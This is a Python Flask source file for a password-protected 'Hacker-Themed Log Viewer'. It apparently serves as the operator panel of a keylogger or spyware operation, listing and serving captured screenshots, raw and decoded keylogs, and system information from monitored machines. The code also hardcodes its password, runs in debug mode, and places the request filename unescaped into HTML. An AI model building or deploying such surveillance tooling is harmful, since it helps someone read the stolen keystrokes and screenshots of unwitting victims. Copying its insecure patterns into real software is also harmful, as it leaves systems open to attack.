from flask import Flask, render_template_string, request, send_from_directory, abort
import os

app = Flask(__name__)

# Set the folder where logs are saved
LOG_FOLDER = "logs"

# HTML template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Monitoring Dashboard</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin-top: 30px;
        }
        th, td {
            border: 1px solid #00ff00;
            padding: 8px;
            text-align: left;
            max-width: 200px;
            word-wrap: break-word;
        }
        th {
            background-color: #1f1f1f;
        }
        a {
            color: #00ffff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>🕵️ Hacker-Themed Log Viewer</h1>
    <form method="POST">
        <label>Password:</label>
        <input type="password" name="password">
        <input type="submit" value="Access">
    </form>

    {% if authenticated %}
        <table>
            <tr>
                <th>Timestamp</th>
                <th>Screenshots</th>
                <th>Keylogs</th>
                <th>System Info</th>
                <th>Performance</th>
                <th>Decoded Keylogs</th>
            </tr>
            {% for row in data %}
            <tr>
                <td>{{ row['timestamp'] }}</td>
                <td><a href="/logs/{{ row['screenshot'] }}" target="_blank">{{ row['screenshot'] }}</a></td>
                <td><a href="/logs/{{ row['keylog'] }}" target="_blank">{{ row['keylog'] }}</a></td>
                <td><a href="/logs/{{ row['system'] }}" target="_blank">{{ row['system'] }}</a></td>
                <td><a href="/logs/{{ row['performance'] }}" target="_blank">{{ row['performance'] }}</a></td>
                <td>
                    {% if row['decoded'] %}
                        <a href="/view_decoded/{{ row['decoded'] }}" target="_blank">{{ row['decoded'] }}</a>
                    {% else %}
                        No decoded keylog
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
        </table>
    {% endif %}
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    authenticated = False
    data = []

    if request.method == 'POST':
        if request.form.get('password') == 'disha456':
            authenticated = True

            # Read all folders inside logs/
            for folder in sorted(os.listdir(LOG_FOLDER), reverse=True):
                folder_path = os.path.join(LOG_FOLDER, folder)
                if os.path.isdir(folder_path):
                    files = os.listdir(folder_path)
                    row = {
                        'timestamp': folder,
                        'screenshot': next((f for f in files if 'screenshot' in f), ''),
                        'keylog': next((f for f in files if 'keylogs_export' in f), ''),
                        'system': next((f for f in files if 'system_info' in f), ''),
                        'performance': next((f for f in files if 'performance' in f), ''),
                        'decoded': next((f for f in files if 'decoded_keylogs' in f), ''),
                    }
                    data.append(row)

    return render_template_string(HTML_TEMPLATE, authenticated=authenticated, data=data)

@app.route('/logs/<path:filename>')
def download_file(filename):
    try:
        # Allow opening any log file
        parts = filename.split('/')
        if len(parts) != 2:
            abort(404)
        folder, file = parts
        return send_from_directory(os.path.join(LOG_FOLDER, folder), file)
    except:
        abort(404)

@app.route('/view_decoded/<path:filename>')
def view_decoded(filename):
    try:
        parts = filename.split('/')
        if len(parts) != 2:
            abort(404)
        folder, file = parts
        file_path = os.path.join(LOG_FOLDER, folder, file)
        if not os.path.exists(file_path):
            abort(404)

        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().replace('<', '&lt;').replace('>', '&gt;').replace('\n', '<br>')

        return f'''
        <html>
            <head>
                <title>{filename}</title>
                <style>
                    body {{
                        background-color: #000;
                        color: #00ff00;
                        font-family: monospace;
                        padding: 20px;
                    }}
                </style>
            </head>
            <body>
                <h2>Decoded Keylog: {filename}</h2>
                <p>{content}</p>
            </body>
        </html>
        '''
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    app.run(debug=True)
